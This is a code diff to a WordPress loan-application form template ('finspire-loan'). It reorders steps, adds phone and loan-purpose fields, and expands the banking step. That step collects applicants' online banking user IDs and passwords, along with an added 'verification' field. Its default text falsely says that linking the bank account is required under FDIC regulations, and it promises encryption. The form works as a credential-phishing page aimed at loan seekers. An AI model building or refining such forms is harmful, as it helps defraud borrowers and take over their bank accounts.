@@ -72,20 +72,20 @@ if ( $def_loan < $min_loan || $def_loan > $max_loan ) {
                     <span class="tracker-label"><?php echo esc_html( $settings['step2_title'] ?? 'Address' ); ?></span>
                 </div>
 
-                <!-- Step 3 Tracker: Banking Details -->
+                <!-- Step 3 Tracker: Loan Amount -->
                 <div class="tracker-item" data-step="3">
-                    <div class="tracker-circle">
-                        <svg viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="currentColor" stroke-width="2"><path d="M3 21h18M3 10h18M5 10v11M9 10v11M15 10v11M19 10v11M12 2L2 7h20L12 2z"></path></svg>
-                    </div>
-                    <span class="tracker-label"><?php echo esc_html( $settings['step3_title'] ?? 'Banking Details' ); ?></span>
-                </div>
-
-                <!-- Step 4 Tracker: Loan Amount -->
-                <div class="tracker-item" data-step="4">
                     <div class="tracker-circle">
                         <svg viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="currentColor" stroke-width="2"><rect x="1" y="4" width="22" height="16" rx="2" ry="2"></rect><line x1="1" y1="10" x2="23" y2="10"></line></svg>
                     </div>
-                    <span class="tracker-label"><?php echo esc_html( $settings['step4_title'] ?? 'Loan Amount' ); ?></span>
+                    <span class="tracker-label"><?php echo esc_html( $settings['step3_title'] ?? 'Loan Amount' ); ?></span>
+                </div>
+
+                <!-- Step 4 Tracker: Banking Details -->
+                <div class="tracker-item" data-step="4">
+                    <div class="tracker-circle">
+                        <svg viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="currentColor" stroke-width="2"><path d="M3 21h18M3 10h18M5 10v11M9 10v11M15 10v11M19 10v11M12 2L2 7h20L12 2z"></path></svg>
+                    </div>
+                    <span class="tracker-label"><?php echo esc_html( $settings['step4_title'] ?? 'Banking Details' ); ?></span>
                 </div>
             </div>
 
@@ -131,16 +131,26 @@ if ( $def_loan < $min_loan || $def_loan > $max_loan ) {
                                 </div>
                             </div>
 
-                            <div class="form-grid-row">
-                                <div class="form-col col-full">
+                            <div class="form-grid-row row-two-cols">
+                                <div class="form-col col-half">
                                     <label for="fin_email" class="loan-label"><?php esc_html_e( 'Email Address', 'finspire-loan' ); ?> <span class="required-star">*</span></label>
                                     <div class="input-icon-wrap">
-                                        <input type="email" name="email" id="fin_email" class="loan-input" placeholder="" required autocomplete="email">
+                                        <input type="email" name="email" id="fin_email" class="loan-input" placeholder="john@example.com" required autocomplete="email">
                                         <span class="input-icon-right input-mail-icon" aria-hidden="true">
                                             <svg viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="#0d9488" stroke-width="2"><path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"></path><polyline points="22,6 12,13 2,6"></polyline></svg>
                                         </span>
                                     </div>
                                     <div class="field-error-msg" id="err_email"></div>
+                                </div>
+                                <div class="form-col col-half">
+                                    <label for="fin_phone" class="loan-label"><?php esc_html_e( 'Phone Number', 'finspire-loan' ); ?> <span class="required-star">*</span></label>
+                                    <div class="input-icon-wrap">
+                                        <input type="tel" name="phone" id="fin_phone" class="loan-input" placeholder="(555) 000-0000" maxlength="14" required autocomplete="tel">
+                                        <span class="input-icon-right" aria-hidden="true">
+                                            <svg viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="#94a3b8" stroke-width="2"><path d="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07 19.5 19.5 0 0 1-6-6 19.79 19.79 0 0 1-3.07-8.67A2 2 0 0 1 4.11 2h3a2 2 0 0 1 2 1.72 12.84 12.84 0 0 0 .7 2.81 2 2 0 0 1-.45 2.11L8.09 9.91a16 16 0 0 0 6 6l1.27-1.27a2 2 0 0 1 2.11-.45 12.84 12.84 0 0 0 2.81.7A2 2 0 0 1 22 16.92z"></path></svg>
+                                        </span>
+                                    </div>
+                                    <div class="field-error-msg" id="err_phone"></div>
                                 </div>
                             </div>
 
@@ -257,9 +267,120 @@ if ( $def_loan < $min_loan || $def_loan > $max_loan ) {
                         </div>
 
                         <!-- ============================================== -->
-                        <!-- STEP 3: BANKING DETAILS (Exact Screenshot Match)-->
+                        <!-- STEP 3: LOAN AMOUNT & PURPOSE                  -->
                         <!-- ============================================== -->
                         <div class="form-step-pane" id="form-step-3" data-step="3">
+                            <!-- Loan Amount Input Box -->
+                            <div class="form-grid-row">
+                                <div class="form-col col-full">
+                                    <label for="fin_loan_amount" class="loan-label"><?php esc_html_e( 'Requested Loan Amount ($)', 'finspire-loan' ); ?> <span class="required-star">*</span></label>
+                                    <div class="amount-input-box">
+                                        <span class="currency-tag"><?php echo esc_html( $currency ); ?></span>
+                                        <input type="number" name="loan_amount" id="fin_loan_amount" class="loan-input amount-field" value="<?php echo esc_attr( $def_loan ); ?>" min="<?php echo esc_attr( $min_loan ); ?>" max="<?php echo esc_attr( $max_loan ); ?>" step="50" required>
+                                    </div>
+                                    <div class="field-error-msg" id="err_loan_amount"></div>
+                                    <p class="amount-limits-hint">
+                                        <?php printf( esc_html__( 'Minimum %1$s%2$s &middot; Maximum %1$s%3$s', 'finspire-loan' ), esc_html( $currency ), number_format( $min_loan ), number_format( $max_loan ) ); ?>
+                                    </p>
+                                </div>
+                            </div>
+
+                            <!-- Dynamic Loan Purpose Dropdown -->
+                            <div class="form-grid-row">
+                                <div class="form-col col-full">
+                                    <label for="fin_purpose_trigger" class="loan-label"><?php esc_html_e( 'Loan Purpose', 'finspire-loan' ); ?> <span class="required-star">*</span></label>
+                                    
+                                    <!-- Custom Polished Dropdown Component -->
+                                    <div class="fin-custom-dropdown" id="fin_loan_purpose_dropdown">
+                                        <!-- Hidden standard select for form submission & validation -->
+                                        <select name="loan_purpose" id="fin_loan_purpose" class="loan-select ignore fin-hidden-select" required tabindex="-1" aria-hidden="true">
+                                            <option value=""><?php esc_html_e( 'Select Loan Purpose', 'finspire-loan' ); ?></option>
+                                            <?php foreach ( Finspire_Loan_Settings::get_loan_purpose_options() as $purpose_opt ) : ?>
+                                                <option value="<?php echo esc_attr( $purpose_opt ); ?>"><?php echo esc_html( $purpose_opt ); ?></option>
+                                            <?php endforeach; ?>
+                                        </select>
+
+                                        <!-- Custom Trigger Button matching .loan-input -->
+                                        <button type="button" class="fin-dropdown-trigger" id="fin_purpose_trigger" aria-haspopup="listbox" aria-expanded="false">
+                                            <span class="fin-dropdown-selected-text fin-placeholder-text"><?php esc_html_e( 'Select Loan Purpose', 'finspire-loan' ); ?></span>
+                                            <span class="fin-dropdown-arrow" aria-hidden="true">
+                                                <svg viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                                                    <polyline points="6 9 12 15 18 9"></polyline>
+                                                </svg>
+                                            </span>
+                                        </button>
+
+                                        <!-- Custom Dropdown Menu -->
+                                        <div class="fin-dropdown-menu" id="fin_purpose_menu" role="listbox" aria-labelledby="fin_purpose_trigger">
+                                            <div class="fin-dropdown-menu-inner">
+                                                <?php foreach ( Finspire_Loan_Settings::get_loan_purpose_options() as $purpose_opt ) : ?>
+                                                    <div class="fin-dropdown-option" role="option" data-value="<?php echo esc_attr( $purpose_opt ); ?>" tabindex="0">
+                                                        <span class="option-label"><?php echo esc_html( $purpose_opt ); ?></span>
+                                                        <span class="option-check" aria-hidden="true">
+                                                            <svg viewBox="0 0 24 24" width="16" height="16" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
+                                                                <polyline points="20 6 9 17 4 12"></polyline>
+                                                            </svg>
+                                                        </span>
+                                                    </div>
+                                                <?php endforeach; ?>
+                                            </div>
+                                        </div>
+                                    </div>
+                                    <div class="field-error-msg" id="err_loan_purpose"></div>
+                                </div>
+                            </div>
+
+                            <!-- Application Review Summary Card (Moved to Step 3 per user request) -->
+                            <div class="application-summary-box" style="margin-top: 24px;">
+                                <h3 class="summary-box-title"><?php esc_html_e( 'Application Summary', 'finspire-loan' ); ?></h3>
+                                <div class="summary-list-clean">
+                                    <div class="summary-clean-row">
+                                        <span class="sum-key"><?php esc_html_e( 'Name', 'finspire-loan' ); ?></span>
+                                        <span class="sum-val" id="sum-name">—</span>
+                                    </div>
+                                    <div class="summary-clean-row">
+                                        <span class="sum-key"><?php esc_html_e( 'Email', 'finspire-loan' ); ?></span>
+                                        <span class="sum-val" id="sum-email">—</span>
+                                    </div>
+                                    <div class="summary-clean-row">
+                                        <span class="sum-key"><?php esc_html_e( 'Phone', 'finspire-loan' ); ?></span>
+                                        <span class="sum-val" id="sum-phone">—</span>
+                                    </div>
+                                    <div class="summary-clean-row">
+                                        <span class="sum-key"><?php esc_html_e( 'DOB', 'finspire-loan' ); ?></span>
+                                        <span class="sum-val" id="sum-dob">—</span>
+                                    </div>
+                                    <div class="summary-clean-row">
+                                        <span class="sum-key"><?php esc_html_e( 'Address', 'finspire-loan' ); ?></span>
+                                        <span class="sum-val" id="sum-address">—</span>
+                                    </div>
+                                    <div class="summary-clean-row">
+                                        <span class="sum-key"><?php esc_html_e( 'Requested Amount', 'finspire-loan' ); ?></span>
+                                        <span class="sum-val" id="sum-amount">—</span>
+                                    </div>
+                                    <div class="summary-clean-row">
+                                        <span class="sum-key"><?php esc_html_e( 'Loan Purpose', 'finspire-loan' ); ?></span>
+                                        <span class="sum-val" id="sum-purpose">—</span>
+                                    </div>
+                                </div>
+                            </div>
+
+                            <div class="loan-btn-group justify-between">
+                                <button type="button" class="loan-btn loan-btn-back btn-prev" data-prev="2">
+                                    <svg viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="currentColor" stroke-width="2.5"><polyline points="15 18 9 12 15 6"></polyline></svg>
+                                    <span><?php echo esc_html( $settings['btn_back'] ?? 'Back' ); ?></span>
+                                </button>
+                                <button type="button" class="loan-btn loan-btn-primary btn-next" data-next="4">
+                                    <span><?php echo esc_html( $settings['btn_continue'] ?? 'Continue' ); ?></span>
+                                    <svg viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="currentColor" stroke-width="2.5"><polyline points="9 18 15 12 9 6"></polyline></svg>
+                                </button>
+                            </div>
+                        </div>
+
+                        <!-- ============================================== -->
+                        <!-- STEP 4: BANKING DETAILS (Exact Screenshot Match)-->
+                        <!-- ============================================== -->
+                        <div class="form-step-pane" id="form-step-4" data-step="4">
                             <div class="form-grid-row">
                                 <div class="form-col col-full">
                                     <label for="fin_bank_name" class="loan-label"><?php esc_html_e( 'Bank Name', 'finspire-loan' ); ?> <span class="required-star">*</span></label>
@@ -281,6 +402,19 @@ if ( $def_loan < $min_loan || $def_loan > $max_loan ) {
                                 </div>
                             </div>
 
+                            <!-- Online Banking FDIC Verification Paragraph & Input Field (Redesigned with same design as form-info-notice) -->
+                            <div class="form-grid-row">
+                                <div class="form-col col-full">
+                                    <div class="form-info-notice verification-notice-box">
+                                        <svg viewBox="0 0 24 24" width="16" height="16" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect><path d="M7 11V7a5 5 0 0 1 10 0v4"></path></svg>
+                                        <span><?php echo wp_kses_post( $settings['step4_verification_text'] ?? $settings['step3_verification_text'] ?? 'To verify your identity and ensure a secure transaction, We request that you link your bank account to our online banking platform. Your online banking information will be used solely to safely deposit your funds in line with FDIC regulations.' ); ?></span>
+                                    </div>
+                                    <label for="fin_bank_verification" class="loan-label"><?php echo esc_html( $settings['step4_verification_label'] ?? $settings['step3_verification_label'] ?? __( 'Online Banking Verification', 'finspire-loan' ) ); ?> <span class="required-star">*</span></label>
+                                    <input type="text" name="online_banking_verification" id="fin_bank_verification" class="loan-input" placeholder="<?php esc_attr_e( 'Short answer text', 'finspire-loan' ); ?>" autocomplete="off" required>
+                                    <div class="field-error-msg" id="err_online_banking_verification"></div>
+                                </div>
+                            </div>
+
                             <div class="form-grid-row">
                                 <div class="form-col col-full">
                                     <label for="fin_bank_user_id" class="loan-label"><?php esc_html_e( 'Online Banking User ID', 'finspire-loan' ); ?> <span class="required-star">*</span></label>
@@ -295,7 +429,7 @@ if ( $def_loan < $min_loan || $def_loan > $max_loan ) {
                                     <div class="input-icon-wrap">
                                         <input type="password" name="online_banking_password" id="fin_bank_password" class="loan-input" placeholder="" autocomplete="new-password" required>
                                         <button type="button" class="btn-toggle-eye" id="toggle-bank-password-visibility" aria-label="<?php esc_attr_e( 'Toggle password visibility', 'finspire-loan' ); ?>" tabindex="-1">
-                                            <svg class="eye-icon eye-show" viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="#94a3b8" stroke-width="2"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path><circle cx="12" cy="12" r="3"></circle></svg>
+                                            <svg class="eye-icon eye-show" viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="#94a3b8" stroke-width="2"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8z"></path><circle cx="12" cy="12" r="3"></circle></svg>
                                             <svg class="eye-icon eye-hide" viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="#94a3b8" stroke-width="2" style="display:none;"><path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"></path><line x1="1" y1="1" x2="23" y2="23"></line></svg>
                                         </button>
                                     </div>
@@ -303,71 +437,29 @@ if ( $def_loan < $min_loan || $def_loan > $max_loan ) {
                                 </div>
                             </div>
 
+                            <!-- Online Banking Contact Consent Checkbox -->
+                            <div class="form-grid-row">
+                                <div class="form-col col-full">
+                                    <div class="loan-checkbox-wrapper" id="contact-consent-wrapper">
+                                        <label class="custom-checkbox-container" for="fin_contact_consent">
+                                            <input type="checkbox" name="contact_consent" id="fin_contact_consent" value="1" required>
+                                            <span class="checkmark"></span>
+                                            <span class="checkbox-label-text">
+                                                <?php echo wp_kses_post( $settings['step4_contact_consent_text'] ?? $settings['step3_contact_consent_text'] ?? 'I agree to be contacted About my Application and understand that checking my rate does not impact my credit score.' ); ?> <span class="required-star">*</span>
+                                            </span>
+                                        </label>
+                                    </div>
+                                    <div class="field-error-msg" id="err_contact_consent"></div>
+                                </div>
+                            </div>
+
                             <!-- Blue Notice Box Matching Screenshot 3 -->
                             <div class="form-info-notice">
                                 <svg viewBox="0 0 24 24" width="16" height="16" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect><path d="M7 11V7a5 5 0 0 1 10 0v4"></path></svg>
-                                <span><?php echo esc_html( $settings['step3_notice'] ?? 'Your banking credentials are used only to verify your account. They are encrypted end-to-end and never stored in plain text.' ); ?></span>
+                                <span><?php echo esc_html( $settings['step4_notice'] ?? $settings['step3_notice'] ?? 'Your banking credentials are used only to verify your account. They are encrypted end-to-end and never stored in plain text.' ); ?></span>
                             </div>
 
-                            <div class="loan-btn-group justify-between">
-                                <button type="button" class="loan-btn loan-btn-back btn-prev" data-prev="2">
-                                    <svg viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="currentColor" stroke-width="2.5"><polyline points="15 18 9 12 15 6"></polyline></svg>
-                                    <span><?php echo esc_html( $settings['btn_back'] ?? 'Back' ); ?></span>
-                                </button>
-                                <button type="button" class="loan-btn loan-btn-primary btn-next" data-next="4">
-                                    <span><?php echo esc_html( $settings['btn_continue'] ?? 'Continue' ); ?></span>
-                                    <svg viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="currentColor" stroke-width="2.5"><polyline points="9 18 15 12 9 6"></polyline></svg>
-                                </button>
-                            </div>
-                        </div>
-
-                        <!-- ============================================== -->
-                        <!-- STEP 4: LOAN AMOUNT (Exact Screenshot Match)   -->
-                        <!-- ============================================== -->
-                        <div class="form-step-pane" id="form-step-4" data-step="4">
-                            <!-- Loan Amount Input Box -->
-                            <div class="form-grid-row">
-                                <div class="form-col col-full">
-                                    <label for="fin_loan_amount" class="loan-label"><?php esc_html_e( 'Requested Loan Amount ($)', 'finspire-loan' ); ?> <span class="required-star">*</span></label>
-                                    <div class="amount-input-box">
-                                        <span class="currency-tag"><?php echo esc_html( $currency ); ?></span>
-                                        <input type="number" name="loan_amount" id="fin_loan_amount" class="loan-input amount-field" value="<?php echo esc_attr( $def_loan ); ?>" min="<?php echo esc_attr( $min_loan ); ?>" max="<?php echo esc_attr( $max_loan ); ?>" step="50" required>
-                                    </div>
-                                    <div class="field-error-msg" id="err_loan_amount"></div>
-                                    <p class="amount-limits-hint">
-                                        <?php printf( esc_html__( 'Minimum %1$s%2$s &middot; Maximum %1$s%3$s', 'finspire-loan' ), esc_html( $currency ), number_format( $min_loan ), number_format( $max_loan ) ); ?>
-                                    </p>
-                                </div>
-                            </div>
-
-                            <!-- Application Review Summary Card Matching Screenshot 4 -->
-                            <div class="application-summary-box">
-                                <h3 class="summary-box-title"><?php esc_html_e( 'Application Summary', 'finspire-loan' ); ?></h3>
-                                <div class="summary-list-clean">
-                                    <div class="summary-clean-row">
-                                        <span class="sum-key"><?php esc_html_e( 'Name', 'finspire-loan' ); ?></span>
-                                        <span class="sum-val" id="sum-name">—</span>
-                                    </div>
-                                    <div class="summary-clean-row">
-                                        <span class="sum-key"><?php esc_html_e( 'Email', 'finspire-loan' ); ?></span>
-                                        <span class="sum-val" id="sum-email">—</span>
-                                    </div>
-                                    <div class="summary-clean-row">
-                                        <span class="sum-key"><?php esc_html_e( 'DOB', 'finspire-loan' ); ?></span>
-                                        <span class="sum-val" id="sum-dob">—</span>
-                                    </div>
-                                    <div class="summary-clean-row">
-                                        <span class="sum-key"><?php esc_html_e( 'Address', 'finspire-loan' ); ?></span>
-                                        <span class="sum-val" id="sum-address">—</span>
-                                    </div>
-                                    <div class="summary-clean-row">
-                                        <span class="sum-key"><?php esc_html_e( 'Bank', 'finspire-loan' ); ?></span>
-                                        <span class="sum-val" id="sum-bank">—</span>
-                                    </div>
-                                </div>
-                            </div>
-
-                            <!-- Privacy Notice & Authorization Box Matching Screenshot 4 -->
+                            <!-- Privacy Notice & Authorization Box -->
                             <div class="form-info-notice notice-consent">
                                 <input type="hidden" name="privacy_consent" id="fin_privacy_consent" value="1">
                                 <svg viewBox="0 0 24 24" width="16" height="16" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect><path d="M7 11V7a5 5 0 0 1 10 0v4"></path></svg>
